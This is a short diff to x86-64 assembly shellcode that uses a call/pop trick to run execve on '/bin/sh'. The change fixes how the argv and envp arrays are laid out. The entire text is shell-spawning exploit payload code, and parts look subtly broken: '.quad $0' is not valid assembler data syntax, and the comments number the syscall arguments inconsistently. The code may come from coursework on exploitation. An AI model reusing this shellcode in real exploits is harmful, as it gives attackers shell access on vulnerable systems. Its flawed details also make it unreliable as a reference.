@@ -27,7 +27,7 @@ payload:
 
         movq    $SYS_execve, %rax        /* syscall arg 1: syscall number */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
-        movq    %rcx, %rsi                 /* syscall arg 2: argv */
+        leaq    8(%rcx), %rsi            /* syscall arg 2: argv */
         movq    $0, %rdx                 /* syscall arg 3: envp */
         syscall                          /* invoke syscall */
 
@@ -37,10 +37,9 @@ payload:
 
 file_to_run:
         .ascii  "/bin/sh\0"
-argv:
         .quad   file_to_run
-envp:
-        .ascii  "\0\0\0\0\0\0\0\0"
+        .quad   $0
+        .quad   $0
 
 callptr:
     call    payload                      /* push STRING ptr to stack */
